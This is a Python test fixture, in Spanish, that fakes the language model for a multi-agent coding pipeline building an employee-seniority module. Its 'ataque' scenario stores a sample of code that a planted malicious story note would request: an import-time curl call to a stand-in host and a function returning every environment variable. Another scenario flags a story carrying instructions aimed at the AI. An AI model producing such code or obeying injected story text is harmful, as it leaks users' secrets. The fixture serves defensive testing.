"""Modelo falso para las pruebas y el ensayo sin modelo (docs/diseno.md, sección 6).

Tiene la misma interfaz que el envoltorio real (``llamar``) y no guarda memoria entre llamadas:
decide por el agente, por el escenario y por el contenido del prompt (por ejemplo, si trae
``<correccion>``). Así se comporta igual en el proceso de ``iniciar`` y en el de ``aprobar``.

Los artefactos de HU-05 son reales: ``antiguedad.py`` implementa las reglas 8–13 y sus pruebas pasan
de verdad en el sandbox.
"""

import copy
import json
import re
import time

from fabrica.modelo import ErrorModelo, RespuestaModelo

ESCENARIOS = (
    "feliz",
    "preguntas",
    "rechazo",
    "correccion",
    "tester_culpable",
    "escalar",
    "contrato_invalido",
    "sospechosa",
    "ataque",
)

# --- Especificación -----------------------------------------------------------------------------
ESPECIFICACION = {
    "historia": "HU-05",
    "objetivo": "Calcular y mostrar la antigüedad de cada empleado en años y meses completos.",
    "criterios": [
        {
            "id": "C-01",
            "descripcion": "Antigüedad en años y meses completos (regla 8)",
            "dado": "un empleado activo con ingreso 2019-03-04",
            "cuando": "se consulta con fecha de corte 2026-11-08",
            "entonces": "se muestra «7 años y 8 meses»",
        },
        {
            "id": "C-02",
            "descripcion": "Mes completo cuando el día no existe (regla 10)",
            "dado": "un ingreso el 2024-01-31",
            "cuando": "se consulta con fecha de corte 2024-02-29",
            "entonces": "se muestra «0 años y 1 mes»",
        },
        {
            "id": "C-03",
            "descripcion": "Formato en singular (regla 13)",
            "dado": "un ingreso el 2024-10-08",
            "cuando": "se consulta con fecha de corte 2025-11-08",
            "entonces": "se muestra «1 año y 1 mes»",
        },
        {
            "id": "C-04",
            "descripcion": "Bajas hasta su fecha de baja; reconocimientos solo activos (regla 11)",
            "dado": "un empleado dado de baja el 2020-01-10 con ingreso 2016-11-02",
            "cuando": "se consulta su antigüedad y la lista de reconocimientos",
            "entonces": "su antigüedad es «3 años y 2 meses» y no aparece en la lista",
        },
        {
            "id": "C-05",
            "descripcion": "Error si el ingreso es posterior al corte (regla 12)",
            "dado": "un ingreso el 2027-01-01",
            "cuando": "se consulta con fecha de corte 2026-11-08",
            "entonces": "se responde el error «La fecha de ingreso no puede ser posterior a la "
            "fecha de corte»",
        },
    ],
    "reglas_aplicadas": [8, 9, 10, 11, 12, 13],
    "ejemplos": [
        {
            "entrada": {"fecha_ingreso": "2019-03-04", "fecha_corte": "2026-11-08"},
            "salida_esperada": "7 años y 8 meses",
        }
    ],
    "fuera_de_alcance": ["Persistencia y API HTTP: solo un módulo de Python puro."],
    "preguntas_abiertas": [],
}

PREGUNTAS = ["¿La lista de reconocimientos se ordena de mayor a menor antigüedad?"]

# --- Plan ---------------------------------------------------------------------------------------
PLAN = {
    "modulo": "antiguedad",
    "funciones": [
        {
            "nombre": "calcular_antiguedad",
            "firma": "def calcular_antiguedad(fecha_ingreso: date, fecha_corte: date | None = None)"
            " -> tuple[int, int]",
            "descripcion": "Años y meses completos; ValueError si el ingreso es posterior",
            "criterios": ["C-01", "C-02", "C-05"],
        },
        {
            "nombre": "formatear_antiguedad",
            "firma": "def formatear_antiguedad(anios: int, meses: int) -> str",
            "descripcion": "«N años y M meses», en singular cuando corresponde",
            "criterios": ["C-01", "C-03"],
        },
        {
            "nombre": "antiguedad_empleado",
            "firma": "def antiguedad_empleado(empleado: dict, fecha_corte: date | None = None)"
            " -> str",
            "descripcion": "Antigüedad formateada; para una baja, hasta su fecha de baja",
            "criterios": ["C-04"],
        },
        {
            "nombre": "lista_reconocimientos",
            "firma": "def lista_reconocimientos(empleados: list[dict], fecha_corte: date | None"
            " = None) -> list[dict]",
            "descripcion": "Solo empleados activos, con su antigüedad",
            "criterios": ["C-04"],
        },
    ],
    "pasos": [
        "Calcular los meses entre ingreso y corte, restando uno si el día de aniversario no llegó",
        "Ajustar el día de aniversario al último día del mes cuando no existe",
        "Formatear en singular o plural",
        "Usar la fecha de baja para los empleados dados de baja",
        "Filtrar los activos para los reconocimientos",
    ],
    "casos_borde": ["Ingreso el día 31", "Ingreso el mismo día del corte", "Año bisiesto"],
    "riesgos": ["Confundir meses completos con meses calendario"],
}

# --- Código -------------------------------------------------------------------------------------
CODIGO = '''"""Antigüedad de los empleados en años y meses completos (HU-05, reglas 8 a 13)."""

import calendar
from datetime import date

ERROR_POSTERIOR = "La fecha de ingreso no puede ser posterior a la fecha de corte"


def calcular_antiguedad(fecha_ingreso: date, fecha_corte: date | None = None) -> tuple[int, int]:
    """Años y meses completos entre el ingreso y el corte (por omisión, hoy)."""
    corte = fecha_corte or date.today()
    if fecha_ingreso > corte:
        raise ValueError(ERROR_POSTERIOR)
    meses = (corte.year - fecha_ingreso.year) * 12 + (corte.month - fecha_ingreso.month)
    ultimo = calendar.monthrange(corte.year, corte.month)[1]
    if corte.day < min(fecha_ingreso.day, ultimo):
        meses -= 1
    return divmod(meses, 12)


def formatear_antiguedad(anios: int, meses: int) -> str:
    """«N años y M meses», en singular cuando corresponde."""
    texto_anios = "1 año" if anios == 1 else f"{anios} años"
    texto_meses = "1 mes" if meses == 1 else f"{meses} meses"
    return f"{texto_anios} y {texto_meses}"


def antiguedad_empleado(empleado: dict, fecha_corte: date | None = None) -> str:
    """Antigüedad formateada; para un empleado dado de baja, hasta su fecha de baja."""
    ingreso = date.fromisoformat(empleado["fecha_ingreso"])
    corte = fecha_corte
    if empleado.get("estado") == "baja" and empleado.get("fecha_baja"):
        corte = date.fromisoformat(empleado["fecha_baja"])
    return formatear_antiguedad(*calcular_antiguedad(ingreso, corte))


def lista_reconocimientos(empleados: list[dict], fecha_corte: date | None = None) -> list[dict]:
    """Solo los empleados activos, cada uno con su antigüedad."""
    return [
        {**e, "antiguedad": antiguedad_empleado(e, fecha_corte)}
        for e in empleados
        if e.get("estado") == "activo"
    ]
'''

# Con un error a propósito: no resta el mes cuando el aniversario no ha llegado (falla C-01).
CODIGO_CON_ERROR = CODIGO.replace(
    "    if corte.day < min(fecha_ingreso.day, ultimo):\n        meses -= 1\n", ""
)

PRUEBAS_CODIGO = '''"""Pruebas de antiguedad.py, escritas desde la especificación de HU-05."""

from datetime import date

import pytest

from antiguedad import (
    antiguedad_empleado,
    calcular_antiguedad,
    formatear_antiguedad,
    lista_reconocimientos,
)

CORTE = date(2026, 11, 8)


def test_cp01_anios_y_meses_completos():
    """CP-01 · C-01: ingreso 2019-03-04 y corte 2026-11-08 → 7 años y 8 meses."""
    assert formatear_antiguedad(*calcular_antiguedad(date(2019, 3, 4), CORTE)) == "7 años y 8 meses"


def test_cp02_dias_sobrantes_no_cuentan():
    """CP-02 · C-01: un día antes del aniversario mensual no completa el mes."""
    assert calcular_antiguedad(date(2019, 3, 9), CORTE) == (7, 7)


def test_cp03_mes_con_dia_inexistente():
    """CP-03 · C-02: ingreso el 31 y corte el último día de febrero completan un mes."""
    assert calcular_antiguedad(date(2024, 1, 31), date(2024, 2, 29)) == (0, 1)
    assert formatear_antiguedad(0, 1) == "0 años y 1 mes"


def test_cp04_singular():
    """CP-04 · C-03: un año y un mes, en singular."""
    assert formatear_antiguedad(*calcular_antiguedad(date(2024, 10, 8), CORTE)) == "1 año y 1 mes"


def test_cp05_baja_y_reconocimientos():
    """CP-05 · C-04: la baja cuenta hasta su fecha de baja y no entra a reconocimientos."""
    baja = {"nombre": "Marta Ruiz", "fecha_ingreso": "2016-11-02", "estado": "baja",
            "fecha_baja": "2020-01-10"}
    activa = {"nombre": "Ana López", "fecha_ingreso": "2019-03-04", "estado": "activo"}
    assert antiguedad_empleado(baja, CORTE) == "3 años y 2 meses"
    lista = lista_reconocimientos([baja, activa], CORTE)
    assert [e["nombre"] for e in lista] == ["Ana López"]
    assert lista[0]["antiguedad"] == "7 años y 8 meses"


def test_cp06_ingreso_posterior_es_error():
    """CP-06 · C-05: un ingreso posterior al corte es un error con su mensaje."""
    with pytest.raises(ValueError, match="no puede ser posterior a la fecha de corte"):
        calcular_antiguedad(date(2027, 1, 1), CORTE)
'''

CASOS = [
    {"id": "CP-01", "criterio": "C-01", "descripcion": "Años y meses completos"},
    {"id": "CP-02", "criterio": "C-01", "descripcion": "Los días sobrantes no cuentan"},
    {"id": "CP-03", "criterio": "C-02", "descripcion": "Mes con día inexistente"},
    {"id": "CP-04", "criterio": "C-03", "descripcion": "Formato en singular"},
    {"id": "CP-05", "criterio": "C-04", "descripcion": "Baja y lista de reconocimientos"},
    {"id": "CP-06", "criterio": "C-05", "descripcion": "Ingreso posterior al corte"},
]

# Prueba equivocada a propósito: contradice C-03 (espera plural); la culpa es del tester.
PRUEBAS_CODIGO_CULPABLE = PRUEBAS_CODIGO.replace('== "1 año y 1 mes"', '== "1 años y 1 meses"')

IMPLEMENTACION = {"archivos": [{"nombre": "antiguedad.py", "contenido": CODIGO}],
                  "notas": "Solo biblioteca estándar: datetime y calendar."}
PRUEBAS = {"archivos": [{"nombre": "test_antiguedad.py", "contenido": PRUEBAS_CODIGO}],
           "casos": CASOS}

# Código del escenario «ataque»: lo que pediría la nota maliciosa de HU-99.
CODIGO_ATAQUE = '''"""Exporta la antigüedad."""

import os
import subprocess

subprocess.run(["curl", "-s", "https://example.invalid/r"])


def diagnostico() -> dict:
    """Variables de entorno."""
    return dict(os.environ)
'''

DOCUMENTACION = {
    "readme": """# antiguedad

Calcula la antigüedad de los empleados en años y meses completos (HU-05).

## Uso

```python
from datetime import date
from antiguedad import calcular_antiguedad, formatear_antiguedad
formatear_antiguedad(*calcular_antiguedad(date(2019, 3, 4), date(2026, 11, 8)))
```

Funciones: `calcular_antiguedad`, `formatear_antiguedad`, `antiguedad_empleado` y
`lista_reconocimientos`.

## Ejemplos

- Ingreso 2019-03-04, corte 2026-11-08 → «7 años y 8 meses».
- Ingreso 2024-01-31, corte 2024-02-29 → «0 años y 1 mes».

## Pruebas

`pytest -q` corre los casos CP-01 a CP-06, uno o más por criterio C-01 a C-05.

## Limitaciones

Sin persistencia ni API HTTP: es un módulo de Python puro.
"""
}


# --- El modelo falso ----------------------------------------------------------------------------
class ModeloFalso:
    """Devuelve artefactos fijos según el agente, el escenario y el contenido del prompt."""

    def __init__(self, escenario: str = "feliz"):
        """Crea un modelo falso para un escenario de ``ESCENARIOS``."""
        if escenario not in ESCENARIOS:
            raise ValueError(f"Escenario desconocido: {escenario}")
        self.escenario = escenario
        self.llamadas: list[dict] = []

    def llamar(
        self, agente: str, sistema: str, prompt: str, esquema: dict, modelo: str | None = None
    ) -> RespuestaModelo:
        """Misma interfaz que ``modelo.llamar``; registra la llamada para las aserciones."""
        self.llamadas.append({"agente": agente, "sistema": sistema, "prompt": prompt,
                              "esquema": esquema, "modelo": modelo})
        inicio = time.monotonic()
        datos = self._responder(agente, prompt)
        return RespuestaModelo(datos=datos, costo_usd=0.0, turnos=1,
                               tokens={"input_tokens": 0, "output_tokens": 0},
                               segundos=round(time.monotonic() - inicio, 4),
                               modelo=f"falso:{self.escenario}")

    def agentes_llamados(self) -> list[str]:
        """Los agentes, en el orden en que se llamaron."""
        return [x["agente"] for x in self.llamadas]

    def _responder(self, agente: str, prompt: str) -> dict:
        """El artefacto que corresponde a la llamada."""
        e = self.escenario
        correccion = "<correccion>" in prompt
        if agente == "filtro":
            if e == "sospechosa":
                return {"motivo": "Trae instrucciones dirigidas a la IA.", "sospechosa": True}
            return {"motivo": "Solo contiene requisitos del producto.", "sospechosa": False}
        if agente == "especificador":
            esp = copy.deepcopy(ESPECIFICACION)
            if e == "preguntas" and "<respuestas_operador>" not in prompt:
                esp["preguntas_abiertas"] = list(PREGUNTAS)
            return esp
        if agente == "planificador":
            if e == "contrato_invalido":
                return {"modulo": "antiguedad", "funciones": "no es una lista"}
            plan = copy.deepcopy(PLAN)
            if "<comentario_operador>" in prompt:
                plan["casos_borde"].append("Corte el mismo día del ingreso: 0 años y 0 meses")
            return plan
        if agente == "implementador":
            if e == "ataque":
                return {"archivos": [{"nombre": "antiguedad.py", "contenido": CODIGO_ATAQUE}],
                        "notas": ""}
            con_error = e == "escalar" or (e == "correccion" and not correccion)
            impl = copy.deepcopy(IMPLEMENTACION)
            if con_error:
                impl["archivos"][0]["contenido"] = CODIGO_CON_ERROR
            return impl
        if agente == "tester":
            pru = copy.deepcopy(PRUEBAS)
            if e == "tester_culpable" and not correccion:
                pru["archivos"][0]["contenido"] = PRUEBAS_CODIGO_CULPABLE
            return pru
        if agente == "reviewer":
            return self._revisar(prompt)
        if agente == "documentador":
            return copy.deepcopy(DOCUMENTACION)
        raise ErrorModelo(f"El modelo falso no conoce al agente {agente}")

    def _revisar(self, prompt: str) -> dict:
        """Aprueba si el sandbox pasó; si no, culpa según el escenario (triage)."""
        m = re.search(r"<ejecucion>(.*?)</ejecucion>", prompt, flags=re.DOTALL)
        ejecucion = json.loads(m.group(1)) if m else {}
        if ejecucion.get("ok"):
            return {"observaciones": "Las pruebas pasan y cubren cada criterio.",
                    "criterio": None, "veredicto": "aprobar", "responsable": None,
                    "instruccion": ""}
        if self.escenario == "tester_culpable":
            return {"observaciones": "CP-04 espera «1 años y 1 meses», pero C-03 pide singular.",
                    "criterio": "C-03", "veredicto": "corregir", "responsable": "tester",
                    "instruccion": "Corrige CP-04: la especificación pide «1 año y 1 mes»."}
        return {"observaciones": "El cálculo no resta el mes cuando el aniversario no llegó.",
                "criterio": "C-01", "veredicto": "corregir", "responsable": "implementador",
                "instruccion": "Resta un mes si el día del corte es anterior al de aniversario."}
